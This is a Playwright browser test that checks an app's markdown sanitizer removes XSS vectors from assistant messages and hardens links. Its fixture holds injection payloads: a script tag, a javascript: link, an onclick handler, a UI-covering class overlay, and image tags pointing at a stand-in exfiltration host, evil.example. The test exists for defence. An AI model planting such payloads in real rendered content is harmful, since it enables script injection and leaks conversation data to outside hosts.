// Producer Pal
// Copyright (C) 2026 Adam Murray
// AI assistance: Claude (Anthropic)
// SPDX-License-Identifier: GPL-3.0-or-later

// Verifies the assistant-markdown sanitizer (sanitize-markdown.ts: marked +
// DOMPurify) in a REAL browser DOM — the only environment DOMPurify supports.
// The unit tests mock DOMPurify (happy-dom mis-walks the DOM under it), so this
// is where the actual XSS-stripping and link-hardening behavior is proven.
import { expect, test } from "@playwright/test";
import {
  expectNoConsoleOutput,
  makeConversation,
  setupConsoleCapture,
  setupUiTest,
} from "./ui-test-helpers";

const captured = setupConsoleCapture();

const EXFIL_URL = "https://evil.example/leak?d=conversation";

// One assistant message exercising markdown rendering plus the injection
// vectors the sanitizer exists to stop.
const ASSISTANT_MARKDOWN = [
  "# Heading",
  "",
  "A [safe link](https://example.com) and a [bad link](javascript:alert(1)).",
  "",
  "- item one",
  "- item two",
  "",
  "<script>alert('xss')</script>",
  // A disallowed tag carrying an event handler: DOMPurify drops the tag (and
  // the handler) but keeps the inner text.
  "<div onclick=\"alert('xss')\">danger</div>",
  // Remote images would leak data to the host; classes would let raw HTML
  // use the bundle's Tailwind utilities to cover the UI.
  `![exfil](${EXFIL_URL})`,
  `<img src="${EXFIL_URL}" alt="raw">`,
  '<a class="fixed inset-0 z-50 bg-white" href="https://example.com">cover</a>',
].join("\n");

test.describe("Assistant markdown sanitization (real browser DOM)", () => {
  test("renders markdown and strips XSS vectors while hardening links", async ({
    page,
  }) => {
    const exfilRequests: string[] = [];

    page.on("request", (request) => {
      if (request.url().includes("evil.example")) {
        exfilRequests.push(request.url());
      }
    });

    await setupUiTest(page, [
      makeConversation({
        id: "md",
        title: "Markdown message",
        updatedAt: 100,
        messages: [
          { role: "user", content: "render markdown" },
          { role: "assistant", content: ASSISTANT_MARKDOWN },
        ],
      }),
    ]);

    await page
      .getByTestId("conversation-item")
      .filter({ hasText: "Markdown message" })
      .click();

    const prose = page
      .getByTestId("assistant-message-bubble")
      .locator(".prose");

    await expect(prose).toBeVisible();

    // Markdown renders to real HTML (the regression that the dompurify 3.4.x
    // bump surfaced under happy-dom).
    await expect(prose.locator("h1")).toHaveText("Heading");
    await expect(prose.locator("ul li")).toHaveCount(2);

    // The safe link is preserved AND hardened to open in a new window.
    const safeLink = prose.getByRole("link", { name: "safe link" });

    await expect(safeLink).toHaveAttribute("href", "https://example.com");
    await expect(safeLink).toHaveAttribute("target", "_blank");
    await expect(safeLink).toHaveAttribute("rel", "noopener noreferrer");

    // XSS vectors are stripped from the rendered HTML.
    const html = await prose.innerHTML();

    expect(html).not.toContain("<script");
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("onclick");
    expect(html).not.toContain("alert(");
    expect(html).not.toContain("<div"); // disallowed tag dropped, text kept
    expect(html).toContain("danger");

    // No images, no classes: nothing was fetched and the link kept no styling.
    expect(html).not.toContain("<img");
    expect(html).not.toContain("class=");
    await expect(prose.getByRole("link", { name: "cover" })).toBeVisible();
    expect(exfilRequests).toStrictEqual([]);

    expectNoConsoleOutput(captured);
  });
});
